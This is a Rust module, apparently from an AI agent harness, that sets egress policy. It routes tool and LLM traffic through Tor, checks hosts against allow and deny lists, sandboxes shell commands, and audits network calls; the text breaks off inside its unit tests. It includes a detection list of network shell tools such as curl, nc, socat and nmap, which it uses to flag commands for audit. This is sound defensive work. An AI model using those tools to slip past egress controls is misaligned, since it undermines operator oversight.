//! Egress policy — the one choke point for LLM-initiated network traffic.
//!
//! Configured by the top-level `[egress]` section (sandbox or base config).
//! **Tor is the default**: `network = "tor"` routes every tool call and every
//! LLM API call through the Tor proxy (`socks5h://127.0.0.1:9050`, i.e. the
//! Arti + lyrebird-rs container from `deploy/tor/`, or `TENGU_TOR_PROXY`).
//! A sandbox that wants the open internet sets `network = "open"`.
//!
//! `install` sets the process-wide policy once the config is resolved; a
//! parent tengu process hands its *resolved* policy to children (`run-agent`,
//! the MCP bridge) via `TENGU_EGRESS`, which wins over the child's own config
//! so the two can't drift. A process that never installs (unit tests) gets
//! the disabled policy: direct connections, no host ceiling, no audit.
//!
//! | Path | Control | Strength |
//! |---|---|---|
//! | `http_request` | proxy + `check_url` on every hop (redirects re-checked) + audit | enforced |
//! | crypto tools (Privy, `tools/crypto/helpers.rs`) | tool client + `check_url` + scope `net_hosts` per request (Privy API, EVM receipt polls) + env through `env_reads` + audit (`tool` = the crypto tool) | enforced |
//! | Hyperliquid info (`outbound/hyperliquid/info.rs`) | tool client + `check_url` + scope `net_hosts` per request + `[rate_limits.hyperliquid]` + audit (`hl_info`) | enforced |
//! | Market-data backfill (`outbound/backfill/`, `tengu history backfill`, `tengu backtest --fetch`) | HL via `HlInfo`; GeckoTerminal OHLCV via `backfill/gecko.rs`: tool client + `check_url` + scope `net_hosts` per request + `[rate_limits.geckoterminal]` + audit (`gecko_ohlcv`) | enforced |
//! | SEC EDGAR filings (`backfill/sec.rs`, `tengu history events`) | tool client + `check_url` + scope `net_hosts` (`www.sec.gov`, `data.sec.gov`) per request + `[rate_limits.sec]` + audit (`sec_edgar`); `User-Agent` = `$SEC_USER_AGENT` | enforced |
//! | Source fetches (`outbound/sources/`, `tengu sources fetch`, O2) | SEC through `SecClient` (the row's hosts, budget, User-Agent variable); EU TED through `sources/ted.rs::TedClient` (anonymous `POST /v3/notices/search`): tool client + `check_url` + scope `net_hosts` = the row's `hosts` per request + the row's `[rate_limits.<name>]` + audit (`ted_search`) | enforced |
//! | MCP `http` servers | proxy, loopback exempt | enforced |
//! | A2A remotes (`outbound/a2a/`: the `a2a` tool, `tengu a2a card\|send\|get\|cancel`) | `peer_client` (proxy, loopback exempt — another harness on this host — no redirects) + `check_url` + the tool's scope `net_hosts` per request + only the configured remote's hosts (a card naming another is refused) + audit (`tool = "a2a"`) | enforced |
//! | Telegram Bot API (`tengu telegram`) | teloxide client (reqwest 0.11) via HTTP CONNECT on the proxy port (`http_connect_proxy`), 30s/60s timeouts | enforced |
//! | LLM API (OpenRouter chat, embeddings, wiki compiler) | proxy iff `route_llm_api` (default: on under Tor) | enforced |
//! | `run_command` / shell skills | `guard_shell` URL check + audit; proxy env vars (loopback exempt); `shell_network = "isolated"` runs `sh` under macOS `sandbox-exec` — only the proxy port is reachable | isolated: kernel-enforced; `proxy_env`: advisory |
//! | MCP `stdio` servers | proxy env vars (loopback exempt, like MCP `http`) | advisory |
//! | Claude Code builtin `Bash` | stripped from the profile while a proxy is set (`claude_code_profile`) | enforced |
//! | Claude Code's / Codex's own API traffic | `HTTPS_PROXY` = HTTP CONNECT on the proxy port (Arti serves CONNECT on 9050) when `route_llm_api` (`claude_cli_env`, both CLI engines) | advisory (the CLI honours the env) |
//!
//! Every `http_request` hop and every network-looking shell command is
//! appended to the JSONL audit log (`audit_log`, default
//! `<TENGU_HOME>/logs/egress.jsonl`); a `denied` / `error` record is
//! also a `tengu::egress` WARN line (tool, host, call id, status, reason).
//!
//! | Audit field | Source |
//! |---|---|
//! | `agent` | the record's own, else the call's [`CallScope`], else `TENGU_AGENT_NAME` (`run-agent` children) |
//! | `session` | the call's [`CallScope`], else `TENGU_SESSION_ID` |
//! | `call_id` | the call's [`CallScope`] (`ToolCall.id`), else `null` |
//! | `run_id` | the process's execution-trace recording ([`set_run_id`]: `bootstrap::trace::open_sink`, every kind but eval), else `TENGU_RUN_ID` (a traced `run-agent` step and its bridge), else `null` |
//! | `ts` · `ts_ms` | RFC 3339 · epoch ms (the trace's clock unit) |
//!
//! A [`CallScope`] is set per tool call by [`AttributedExecutor`]: every
//! agent's tool stack carries one naming the call id only
//! (`bootstrap::tools::build_tool_executor`, the MCP bridge: chat, plan
//! steps, webhook and A2A agents, eval), and `tengu run` wraps a fuller one
//! around each `[feeds.<n>]` tool feed (agent = the feed's, session
//! `feed:<name>`) and each decision loop (`tengu run`, `tengu webhooks`,
//! `tengu decide`: agent = the loop's, session = the event's session id) —
//! one process runs every feed and loop, so the process env cannot name
//! them. The outermost scope names a call; an empty agent / session falls
//! back to the env.

use std::future::Future;
use std::io::Write;
use std::net::ToSocketAddrs;
use std::path::PathBuf;
use std::sync::{Arc, RwLock};
use std::time::Duration;

use anyhow::{anyhow, bail, Context, Result};
use once_cell::sync::Lazy;
use reqwest::Url;
use serde_json::Value;

use crate::config::egress::{EgressConfig, SHELL_ISOLATED};
use crate::domain::message::{Message, ToolCall};
use crate::domain::scope::host_matches;
use crate::ports::engine::ToolExecutor;
use crate::ports::tool::ToolOutput;

/// Env var carrying the parent's resolved `EgressConfig` (JSON) to children.
pub(crate) const EGRESS_ENV: &str = "TENGU_EGRESS";

/// Who the egress records of one tool call belong to (module table).
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct CallScope {
    pub agent: String,
    pub session: String,
    pub call_id: String,
}

tokio::task_local! {
    static CALL_SCOPE: CallScope;
}

/// Run `fut` with `scope` naming every egress record it writes (on this
/// task; a task it spawns does not inherit it).
pub(crate) async fn audited_as<F: Future>(scope: CallScope, fut: F) -> F::Output {
    CALL_SCOPE.scope(scope, fut).await
}

/// The scope of the call running on this task, if any.
pub(crate) fn call_scope() -> Option<CallScope> {
    CALL_SCOPE.try_with(Clone::clone).ok()
}

/// Env var naming a parent's recording for a `run-agent` step and its
/// bridge ([`run_id`]).
pub(crate) const RUN_ID_ENV: &str = "TENGU_RUN_ID";

static RUN_ID: RwLock<Option<String>> = RwLock::new(None);

/// Name this process's recording on every egress record from now on (module
/// table); `None` clears it.
pub(crate) fn set_run_id(run_id: Option<&str>) {
    if let Ok(mut w) = RUN_ID.write() {
        *w = run_id.map(str::to_string);
    }
}

/// The recording this process's egress records belong to: [`set_run_id`],
/// else `TENGU_RUN_ID`.
pub(crate) fn run_id() -> Option<String> {
    RUN_ID
        .read()
        .ok()
        .and_then(|r| r.clone())
        .or_else(|| std::env::var(RUN_ID_ENV).ok().filter(|v| !v.is_empty()))
}

/// How [`AttributedExecutor`] names a call's session.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum CallSession {
    /// Every call: this session (a feed: `feed:<name>`).
    Fixed(String),
    /// Decision loop `<name>`: its call ids are `<name>:<session_id>:<t>`
    /// (`application/decision_loop`) — the event's `session_id`.
    Loop(String),
}

impl CallSession {
    /// The session of call `call_id`; a loop id of another shape is its own
    /// session.
    pub(crate) fn of(&self, call_id: &str) -> String {
        match self {
            CallSession::Fixed(s) => s.clone(),
            CallSession::Loop(name) => call_id
                .strip_prefix(name.as_str())
                .and_then(|rest| rest.strip_prefix(':'))
                .and_then(|rest| rest.rsplit_once(':'))
                .map_or_else(|| call_id.to_string(), |(session, _)| session.to_string()),
        }
    }
}

/// A tool executor whose every call runs under a [`CallScope`]: `agent`,
/// [`CallSession::of`] the call id, the call id (module table). A call that
/// already runs under one (an outer `AttributedExecutor`: a loop, a feed)
/// keeps it.
pub(crate) struct AttributedExecutor {
    inner: Arc<dyn ToolExecutor>,
    agent: String,
    session: CallSession,
}

impl AttributedExecutor {
    pub(crate) fn new(inner: Arc<dyn ToolExecutor>, agent: &str, session: CallSession) -> Self {
        Self {
            inner,
            agent: agent.to_string(),
            session,
        }
    }

    /// Names only the call id; agent and session stay the process's
    /// (`TENGU_AGENT_NAME` / `TENGU_SESSION_ID`, module table): every
    /// agent's tool stack.
    pub(crate) fn call_ids(inner: Arc<dyn ToolExecutor>) -> Self {
        Self::new(inner, "", CallSession::Fixed(String::new()))
    }

    fn scope(&self, call: &ToolCall) -> CallScope {
        CallScope {
            agent: self.agent.clone(),
            session: self.session.of(&call.id),
            call_id: call.id.clone(),
        }
    }
}

#[async_trait::async_trait]
impl ToolExecutor for AttributedExecutor {
    async fn execute(&self, call: &ToolCall, messages: &[Message]) -> Result<String> {
        if call_scope().is_some() {
            return self.inner.execute(call, messages).await;
        }
        audited_as(self.scope(call), self.inner.execute(call, messages)).await
    }

    async fn execute_typed(&self, call: &ToolCall, messages: &[Message]) -> Result<ToolOutput> {
        if call_scope().is_some() {
            return self.inner.execute_typed(call, messages).await;
        }
        audited_as(self.scope(call), self.inner.execute_typed(call, messages)).await
    }
}

const SANDBOX_EXEC: &str = "/usr/bin/sandbox-exec";

/// Hosts every proxied client leaves direct (loopback only).
const LOOPBACK_NO_PROXY: &str = "localhost,127.0.0.1,::1";

/// Proxy env vars exported to shell children and MCP stdio servers.
const PROXY_ENV_VARS: &[&str] = &[
    "ALL_PROXY",
    "all_proxy",
    "HTTPS_PROXY",
    "https_proxy",
    "HTTP_PROXY",
    "http_proxy",
];

/// Binaries whose presence makes a shell command worth auditing even when
/// it carries no URL literal.
const NETWORK_BINS: &[&str] = &[
    "curl",
    "wget",
    "nc",
    "ncat",
    "netcat",
    "socat",
    "telnet",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "ftp",
    "git",
    "http",
    "https",
    "aria2c",
    "lynx",
    "w3m",
    "dig",
    "nslookup",
    "host",
    "ping",
    "traceroute",
    "nmap",
];

static URL_RE: Lazy<regex::Regex> =
    Lazy::new(|| regex::Regex::new(r#"(?i)\bhttps?://[^\s'"<>`]+"#).expect("static regex"));

/// Resolved, process-wide egress policy.
pub(crate) struct EgressPolicy {
    cfg: EgressConfig,
    audit_path: Option<PathBuf>,
}

static POLICY: Lazy<RwLock<Arc<EgressPolicy>>> =
    Lazy::new(|| RwLock::new(Arc::new(EgressPolicy::disabled())));

/// Current process-wide policy (disabled until `install`).
pub(crate) fn policy() -> Arc<EgressPolicy> {
    match POLICY.read() {
        Ok(guard) => Arc::clone(&guard),
        Err(poisoned) => Arc::clone(&poisoned.into_inner()),
    }
}

/// Install the process-wide policy. `TENGU_EGRESS` (set by a parent tengu
/// process) wins over `cfg`. Invalid config is an error — callers must not
/// continue with network access on a policy they couldn't apply.
pub(crate) fn install(cfg: &EgressConfig) -> Result<()> {
    let effective = match std::env::var(EGRESS_ENV) {
        Ok(raw) => serde_json::from_str::<EgressConfig>(&raw)
            .with_context(|| format!("{EGRESS_ENV} is not valid [egress] JSON"))?,
        Err(_) => cfg.clone(),
    };
    let policy = EgressPolicy::from_config(effective)?;
    tracing::info!(
        target: "tengu::egress",
        proxy = policy.cfg.proxy.as_deref().unwrap_or("direct"),
        route_llm_api = policy.cfg.route_llm_api,
        allow_hosts = ?policy.cfg.allow_hosts,
        deny_hosts = ?policy.cfg.deny_hosts,
        https_only = policy.cfg.https_only,
        shell_network = %policy.cfg.shell_network,
        audit_log = ?policy.audit_path,
        "egress policy installed"
    );
    let mut guard = POLICY.write().unwrap_or_else(|p| p.into_inner());
    *guard = Arc::new(policy);
    Ok(())
}

impl EgressPolicy {
    fn disabled() -> Self {
        Self {
            cfg: EgressConfig {
                audit: false,
                ..EgressConfig::open().resolved()
            },
            audit_path: None,
        }
    }

    pub(crate) fn from_config(cfg: EgressConfig) -> Result<Self> {
        let errors = cfg.validation_errors();
        if !errors.is_empty() {
            bail!("invalid [egress] config:\n- {}", errors.join("\n- "));
        }
        let cfg = cfg.resolved();
        let audit_path = cfg.audit_file(&crate::config::paths::Layout::current());
        if let Some(dir) = audit_path.as_ref().and_then(|p| p.parent()) {
            let _ = std::fs::create_dir_all(dir);
        }
        Ok(Self { cfg, audit_path })
    }

    pub(crate) fn config(&self) -> &EgressConfig {
        &self.cfg
    }

    pub(crate) fn proxy(&self) -> Option<&str> {
        self.cfg.proxy.as_deref()
    }

    /// `[egress].network` after resolution (`tor` | `open`).
    pub(crate) fn network(&self) -> &str {
        &self.cfg.network
    }

    pub(crate) fn route_llm_api(&self) -> bool {
        self.cfg.route_llm_api.unwrap_or(false)
    }

    /// Log (don't fail) when the proxy port doesn't accept connections —
    /// under `network = "tor"` every request would error until it does.
    pub(crate) fn warn_if_proxy_unreachable(&self) {
        let Some(addr) = self.proxy_socket_addr() else {
            return;
        };
        // Every resolved address, like reqwest does (`localhost` may resolve
        // to `::1` first while the proxy listens on 127.0.0.1 only).
        let reachable = addr
            .to_socket_addrs()
            .map(|addrs| {
                addrs.into_iter().any(|sa| {
                    std::net::TcpStream::connect_timeout(&sa, Duration::from_secs(1)).is_ok()
                })
            })
            .unwrap_or(false);
        if !reachable {
            tracing::warn!(
                target: "tengu::egress",
                proxy = %addr,
                "egress: network = \"{}\" but the proxy is not reachable — start it with \
                 `make tor` (deploy/tor/) or set `[egress] network = \"open\"`; requests \
                 fail closed until then",
                self.cfg.network
            );
        }
    }

    /// `host:port` of the proxy, for reachability checks.
    pub(crate) fn proxy_socket_addr(&self) -> Option<String> {
        let url = Url::parse(self.proxy()?).ok()?;
        let host = url
            .host_str()?
            .trim_matches(|c| c == '[' || c == ']')
            .to_string();
        Some(format!("{}:{}", host, url.port()?))
    }

    /// `http://host:port` form of the proxy for clients that only speak HTTP
    /// CONNECT (the Claude Code CLI). Arti serves CONNECT on the same port as
    /// SOCKS (`enable_http_connect = true` in `deploy/tor/arti.toml`), so a
    /// `socks5h://` proxy maps to `http://` on the same host:port; an
    /// `http(s)://` proxy is used as-is.
    pub(crate) fn http_connect_proxy(&self) -> Option<String> {
        let raw = self.proxy()?;
        let url = Url::parse(raw).ok()?;
        match url.scheme() {
            "http" | "https" => Some(raw.to_string()),
            // `host_str` keeps the `[...]` of an IPv6 literal, which the URL
            // form needs (unlike `proxy_socket_addr`, which strips it).
            _ => Some(format!("http://{}:{}", url.host_str()?, url.port()?)),
        }
    }

    /// Env for the Claude Code CLI child: its own Anthropic API traffic goes
    /// through the proxy via `HTTPS_PROXY` when `route_llm_api` is set.
    /// Empty otherwise (the CLI then connects directly, like OpenRouter does
    /// when `route_llm_api = false`).
    pub(crate) fn claude_cli_env(&self) -> Vec<(&'static str, String)> {
        if !self.route_llm_api() {
            return Vec::new();
        }
        let Some(proxy) = self.http_connect_proxy() else {
            return Vec::new();
        };
        vec![
            ("HTTPS_PROXY", proxy.clone()),
            ("HTTP_PROXY", proxy),
            ("NO_PROXY", LOOPBACK_NO_PROXY.to_string()),
        ]
    }

    pub(crate) fn audit_path(&self) -> Option<&PathBuf> {
        self.audit_path.as_ref()
    }

    pub(crate) fn is_isolated_shell(&self) -> bool {
        self.cfg.shell_network == SHELL_ISOLATED
    }

    fn via(&self) -> &'static str {
        if self.cfg.proxy.is_some() {
            "proxy"
        } else {
            "direct"
        }
    }

    /// `TENGU_EGRESS` value for a child process, with the audit path
    /// resolved so parent and child append to the same file.
    pub(crate) fn child_env(&self) -> String {
        let mut cfg = self.cfg.clone();
        cfg.audit_log = self.audit_path.clone();
        serde_json::to_string(&cfg).unwrap_or_default()
    }

    pub(crate) fn check_host(&self, host: &str) -> Result<()> {
        if let Some(p) = self.cfg.deny_hosts.iter().find(|p| host_matches(p, host)) {
            bail!("egress: host '{host}' matches deny_hosts pattern '{p}'");
        }
        if !self.cfg.allow_hosts.is_empty()
            && !self.cfg.allow_hosts.iter().any(|p| host_matches(p, host))
        {
            bail!(
                "egress: host '{host}' not in allow_hosts {:?}",
                self.cfg.allow_hosts
            );
        }
        Ok(())
    }

    /// Scheme (http/https, `https_only`) + host ceiling.
    pub(crate) fn check_url(&self, url: &Url) -> Result<()> {
        match url.scheme() {
            "https" => {}
            "http" if self.cfg.https_only => {
                bail!("egress: plain http:// refused (https_only) for '{url}'")
            }
            "http" => {}
            other => bail!("egress: scheme '{other}' refused for '{url}' (http/https only)"),
        }
        let host = url
            .host_str()
            .filter(|h| !h.is_empty())
            .ok_or_else(|| anyhow!("egress: url '{url}' has no host"))?;
        self.check_host(host)
    }

    fn apply_proxy(
        &self,
        builder: reqwest::ClientBuilder,
        exempt_loopback: bool,
    ) -> Result<reqwest::ClientBuilder> {
        let Some(raw) = self.proxy() else {
            return Ok(builder);
        };
        let mut proxy =
            reqwest::Proxy::all(raw).with_context(|| format!("egress proxy '{raw}'"))?;
        if exempt_loopback {
            proxy = proxy.no_proxy(reqwest::NoProxy::from_string(LOOPBACK_NO_PROXY));
        }
        // `.proxy()` also turns off reqwest's env-var proxy detection, so the
        // configured proxy is the only route.
        Ok(builder.proxy(proxy))
    }

    /// Client for tool traffic (`http_request`, crypto). Redirects are NOT
    /// followed — `http_request` follows them itself so every hop is checked.
    pub(crate) fn tool_client(&self, timeout: Duration) -> Result<reqwest::Client> {
        let builder = reqwest::Client::builder()
            .timeout(timeout)
            .redirect(reqwest::redirect::Policy::none());
        self.apply_proxy(builder, false)?
            .build()
            .context("egress: build tool http client")
    }

    /// Client builder for LLM provider traffic; proxied iff `route_llm_api`.
    pub(crate) fn llm_api_client(
        &self,
        builder: reqwest::ClientBuilder,
    ) -> Result<reqwest::Client> {
        let builder = if self.route_llm_api() {
            self.apply_proxy(builder, false)?
        } else {
            builder
        };
        builder.build().context("egress: build LLM API http client")
    }

    /// Client for operator-configured agent peers (A2A remotes,
    /// `outbound/a2a/`): proxied, loopback exempt (another harness on this
    /// host stays reachable under Tor), redirects NOT followed.
    pub(crate) fn peer_client(&self, timeout: Duration) -> Result<reqwest::Client> {
        let builder = reqwest::Client::builder()
            .timeout(timeout)
            .redirect(reqwest::redirect::Policy::none());
        self.apply_proxy(builder, true)?
            .build()
            .context("egress: build A2A peer http client")
    }

    /// Client for operator-configured MCP `http` servers. Proxied; loopback
    /// servers stay reachable.
    pub(crate) fn mcp_client(&self, builder: reqwest::ClientBuilder) -> Result<reqwest::Client> {
        self.apply_proxy(builder, true)?
            .build()
            .context("egress: build MCP http client")
    }

    /// Proxy env for child processes (shells, MCP stdio servers). Empty when
    /// no proxy is configured. Loopback stays direct — the same exemption
    /// `mcp_client` applies — so a local DB / API next to tengu keeps working.
    pub(crate) fn proxy_env(&self) -> Vec<(&'static str, String)> {
        let Some(proxy) = self.proxy() else {
            return Vec::new();
        };
        PROXY_ENV_VARS
            .iter()
            .map(|k| (*k, proxy.to_string()))
            .chain([
                ("NO_PROXY", LOOPBACK_NO_PROXY.to_string()),
                ("no_proxy", LOOPBACK_NO_PROXY.to_string()),
            ])
            .collect()
    }

    /// `sh -c <command>` with proxy env; under `shell_network = "isolated"`
    /// wrapped in `sandbox-exec` so the kernel refuses every outbound
    /// connection except the proxy port (DNS included).
    pub(crate) fn shell_command(&self, command: &str) -> std::process::Command {
        let mut cmd = if self.is_isolated_shell() {
            let mut c = std::process::Command::new(SANDBOX_EXEC);
            c.arg("-p")
                .arg(self.sandbox_profile())
                .arg("/bin/sh")
                .arg("-c")
                .arg(command);
            c
        } else {
            let mut c = std::process::Command::new("sh");
            c.arg("-c").arg(command);
            c
        };
        for (k, v) in self.proxy_env() {
            cmd.env(k, v);
        }
        cmd
    }

    fn sandbox_profile(&self) -> String {
        let mut profile = String::from("(version 1)\n(allow default)\n(deny network-outbound)\n");
        if let Some(port) = self
            .proxy()
            .and_then(|p| Url::parse(p).ok())
            .and_then(|u| u.port())
        {
            profile.push_str(&format!(
                "(allow network-outbound (remote ip \"localhost:{port}\"))\n"
            ));
        }
        profile
    }

    /// Claude Code builtin profile to actually launch. The builtin `Bash`
    /// has no egress control, so `editor_shell` drops to `editor` while a
    /// proxy is set. The CLI's own API traffic follows `claude_cli_env`.
    pub(crate) fn claude_code_profile<'a>(&self, requested: &'a str) -> &'a str {
        if self.proxy().is_some() && requested == "editor_shell" {
            tracing::warn!(
                target: "tengu::egress",
                "claude_code builtin Bash bypasses [egress].proxy — launching with profile 'editor'"
            );
            return "editor";
        }
        requested
    }

    /// Best-effort pre-flight for shell commands: every `http(s)://` literal
    /// must pass `check_url`. A denial is audited here; an allowed command
    /// with a URL or a network binary is audited by `ShellAudit::finish`
    /// once its outcome is known. Obfuscated URLs slip past this —
    /// `shell_network = "isolated"` is the hard control.
    pub(crate) fn guard_shell(self: &Arc<Self>, tool: &str, command: &str) -> Result<ShellAudit> {
        let urls = extract_urls(command);
        if urls.is_empty() && !mentions_network_bin(command) {
            return Ok(ShellAudit { pending: None });
        }
        let event = serde_json::json!({
            "tool": tool,
            "command": command,
            "urls": urls,
            "shell_network": self.cfg.shell_network,
        });
        let verdict = urls.iter().try_for_each(|raw| {
            let url = Url::parse(raw).map_err(|e| anyhow!("egress: bad url '{raw}': {e}"))?;
            self.check_url(&url)
        });
        if let Err(e) = verdict {
            let mut event = event;
            event["verdict"] = "denied".into();
            event["reason"] = format!("{e:#}").into();
            self.audit(event);
            return Err(e);
        }
        Ok(ShellAudit {
            pending: Some((Arc::clone(self), event)),
        })
    }

    /// Append one audit record (JSONL); a `denied` / `error` one is also a
    /// WARN line in `tengu.log` ([`warn_failure`]). Adds `ts`, `pid`,
    /// `session`, `agent`, `call_id` (module table), `via`, `proxy`.
    /// Fail-soft on I/O.
    pub(crate) fn audit(&self, mut event: Value) {
        let Some(path) = &self.audit_path else {
            return;
        };
        self.stamp(&mut event, call_scope());
        warn_failure(&event);
        let line = event.to_string();
        let written = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(path)
            .and_then(|mut f| f.write_all(format!("{line}\n").as_bytes()));
        if let Err(e) = written {
            tracing::warn!(target: "tengu::egress", path = %path.display(), error = %e, "egress audit write failed");
        }
    }

    /// The fields [`EgressPolicy::audit`] adds (module table); `scope` =
    /// the call running on this task.
    fn stamp(&self, event: &mut Value, scope: Option<CallScope>) {
        let Value::Object(map) = event else {
            return;
        };
        let now = chrono::Utc::now();
        map.insert("ts".into(), now.to_rfc3339().into());
        map.insert("ts_ms".into(), now.timestamp_millis().into());
        map.insert("pid".into(), std::process::id().into());
        let env = |k: &str| std::env::var(k).ok();
        let named = |v: String| (!v.is_empty()).then_some(v);
        let (agent, session, call_id) = match scope {
            Some(s) => (
                named(s.agent).or_else(|| env("TENGU_AGENT_NAME")),
                named(s.session).or_else(|| env("TENGU_SESSION_ID")),
                Some(s.call_id),
            ),
            None => (env("TENGU_AGENT_NAME"), env("TENGU_SESSION_ID"), None),
        };
        map.insert("session".into(), session.into());
        map.entry("agent").or_insert_with(|| agent.into());
        map.insert("call_id".into(), call_id.into());
        map.insert("run_id".into(), run_id().into());
        map.insert("via".into(), self.via().into());
        map.insert("proxy".into(), self.cfg.proxy.clone().into());
    }
}

/// The `tengu.log` line of a failed audit record (`verdict` `denied` /
/// `error`), naming tool, host (a shell command: its URLs), call id, status
/// and reason; an allowed one is only in `egress.jsonl` (it was mirrored
/// at INFO: 89% of `tengu.log`). `None` = not a failure.
fn failure_fields(event: &Value) -> Option<[String; 6]> {
    let verdict = event["verdict"].as_str()?;
    if !matches!(verdict, "denied" | "error") {
        return None;
    }
    let text = |k: &str| event[k].as_str().unwrap_or_default().to_string();
    let host = event["host"]
        .as_str()
        .map(str::to_string)
        .unwrap_or_else(|| {
            event["urls"]
                .as_array()
                .map(|u| {
                    u.iter()
                        .filter_map(Value::as_str)
                        .collect::<Vec<_>>()
                        .join(" ")
                })
                .unwrap_or_default()
        });
    let status = event["status"]
        .as_u64()
        .map(|s| s.to_string())
        .unwrap_or_default();
    Some([
        verdict.to_string(),
        text("tool"),
        host,
        text("call_id"),
        status,
        text("reason"),
    ])
}

fn warn_failure(event: &Value) {
    if let Some([verdict, tool, host, call_id, status, reason]) = failure_fields(event) {
        tracing::warn!(
            target: "tengu::egress",
            %verdict, %tool, %host, %call_id, %status, %reason,
            "egress {verdict}"
        );
    }
}

/// Audit record for a shell command that passed `guard_shell`, written
/// with its outcome (a sandbox refusal shows up as `verdict = "error"`).
pub(crate) struct ShellAudit {
    pending: Option<(Arc<EgressPolicy>, Value)>,
}

impl ShellAudit {
    pub(crate) fn finish<T>(self, outcome: &Result<T>) {
        let Some((policy, mut event)) = self.pending else {
            return;
        };
        match outcome {
            Ok(_) => event["verdict"] = "allowed".into(),
            Err(e) => {
                event["verdict"] = "error".into();
                event["reason"] = format!("{e:#}").into();
            }
        }
        policy.audit(event);
    }
}

fn extract_urls(command: &str) -> Vec<String> {
    URL_RE
        .find_iter(command)
        .map(|m| {
            m.as_str()
                .trim_end_matches([')', ']', ',', ';', '.', '\\'])
                .to_string()
        })
        .collect()
}

fn mentions_network_bin(command: &str) -> bool {
    command
        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&' | '(' | ')' | '`'))
        .filter_map(|tok| tok.rsplit('/').next())
        .any(|tok| NETWORK_BINS.contains(&tok))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::egress::{DEFAULT_TOR_PROXY, NETWORK_OPEN, NETWORK_TOR};

    fn policy_with(cfg: EgressConfig) -> Arc<EgressPolicy> {
        Arc::new(EgressPolicy {
            cfg: cfg.resolved(),
            audit_path: None,
        })
    }

    fn open_with(f: impl FnOnce(&mut EgressConfig)) -> EgressConfig {
        let mut cfg = EgressConfig::open();
        f(&mut cfg);
        cfg
    }

    #[test]
    fn default_is_tor_with_llm_api_routed() {
        let cfg = EgressConfig::default();
        assert!(cfg.validation_errors().is_empty());
        let p = policy_with(cfg);
        assert_eq!(p.network(), NETWORK_TOR);
        assert_eq!(p.proxy(), Some(DEFAULT_TOR_PROXY));
        assert!(p.route_llm_api());
        assert!(!p.proxy_env().is_empty());
        assert_eq!(p.proxy_socket_addr().as_deref(), Some("127.0.0.1:9050"));
        // Empty TOML section == default: Tor.
        let parsed: EgressConfig = toml::from_str("").unwrap();
        assert!(parsed.is_tor());
    }

    #[test]
    fn open_network_is_direct_and_permissive() {
        let cfg = EgressConfig::open();
        assert!(cfg.validation_errors().is_empty());
        let p = policy_with(cfg);
        assert_eq!(p.network(), NETWORK_OPEN);
        assert_eq!(p.proxy(), None);
        assert!(!p.route_llm_api());
        assert!(p.proxy_env().is_empty());
        assert!(p.claude_cli_env().is_empty());
        assert!(p
            .check_url(&Url::parse("http://anything.example/x").unwrap())
            .is_ok());
        let parsed: EgressConfig = toml::from_str("network = \"open\"").unwrap();
        assert!(!parsed.is_tor());
    }

    #[test]
    fn explicit_values_win_over_network_defaults() {
        // tor + explicit proxy + LLM API direct
        let p = policy_with(EgressConfig {
            proxy: Some("socks5h://10.0.0.5:9050".into()),
            route_llm_api: Some(false),
            ..EgressConfig::default()
        });
        assert_eq!(p.proxy(), Some("socks5h://10.0.0.5:9050"));
        assert!(!p.route_llm_api());
        // open + explicit (non-Tor) proxy
        let p = policy_with(open_with(|c| {
            c.proxy = Some("http://proxy.corp:3128".into())
        }));
        assert_eq!(p.proxy(), Some("http://proxy.corp:3128"));
        assert!(!p.route_llm_api());
    }

    #[test]
    fn resolved_config_round_trips_through_child_env() {
        let p = policy_with(EgressConfig::default());
        let child: EgressConfig = serde_json::from_str(&p.child_env()).unwrap();
        assert_eq!(child.proxy.as_deref(), Some(DEFAULT_TOR_PROXY));
        assert_eq!(child.route_llm_api, Some(true));
        assert_eq!(child.resolved(), child);
    }

    #[test]
    fn unknown_network_is_rejected() {
        let cfg = EgressConfig {
            network: "vpn".into(),
            ..EgressConfig::default()
        };
        assert!(cfg.validation_errors()[0].contains("egress.network"));
    }

    #[test]
    fn claude_cli_env_maps_socks_proxy_to_http_connect() {
        let p = policy_with(EgressConfig::default());
        let env = p.claude_cli_env();
        assert!(env
            .iter()
            .any(|(k, v)| *k == "HTTPS_PROXY" && v == "http://127.0.0.1:9050"));
        assert!(env.iter().any(|(k, _)| *k == "NO_PROXY"));
        let http = policy_with(open_with(|c| {
            c.proxy = Some("http://tor:9050".into());
            c.route_llm_api = Some(true);
        }));
        assert_eq!(
            http.http_connect_proxy().as_deref(),
            Some("http://tor:9050")
        );
        let direct_llm = policy_with(EgressConfig {
            route_llm_api: Some(false),
            ..EgressConfig::default()
        });
        assert!(direct_llm.claude_cli_env().is_empty());
    }

    #[test]
    fn proxy_validation_rejects_dns_leaking_and_portless() {
        let bad = |proxy: &str| open_with(|c| c.proxy = Some(proxy.into()));
        assert!(bad("socks5h://127.0.0.1:9050")
            .validation_errors()
            .is_empty());
        assert!(bad("socks5://127.0.0.1:9050").validation_errors()[0].contains("DNS leak"));
        assert!(bad("socks5h://127.0.0.1").validation_errors()[0].contains("explicit port"));
        assert!(bad("ftp://127.0.0.1:21").validation_errors()[0].contains("unsupported"));
    }

    #[test]
    fn route_llm_api_requires_proxy() {
        let cfg = open_with(|c| c.route_llm_api = Some(true));
        assert!(cfg.validation_errors()[0].contains("needs egress.proxy"));
    }

    #[test]
    fn unknown_field_is_a_parse_error() {
        let err = toml::from_str::<EgressConfig>("allowed_hosts = [\"a.com\"]").unwrap_err();
        assert!(err.to_string().contains("allowed_hosts"), "{err}");
    }

    #[test]
    fn host_ceiling_deny_wins_then_allow_list() {
        let p = policy_with(open_with(|c| {
            c.allow_hosts = vec!["*.wikipedia.org".into(), "api.coingecko.com".into()];
            c.deny_hosts = vec!["evil.wikipedia.org".into()];
        }));
        assert!(p.check_host("en.wikipedia.org").is_ok());
        assert!(p.check_host("api.coingecko.com").is_ok());
        assert!(p.check_host("evil.wikipedia.org").is_err());
        assert!(p.check_host("example.com").is_err());
    }

    #[test]
    fn check_url_enforces_scheme_and_https_only() {
        let p = policy_with(open_with(|c| c.https_only = true));
        assert!(p.check_url(&Url::parse("https://a.com").unwrap()).is_ok());
        assert!(p.check_url(&Url::parse("http://a.com").unwrap()).is_err());
        assert!(p.check_url(&Url::parse("ftp://a.com").unwrap()).is_err());
    }

    #[test]
    fn proxy_env_exports_all_variants_and_exempts_loopback() {
        let p = policy_with(EgressConfig::default());
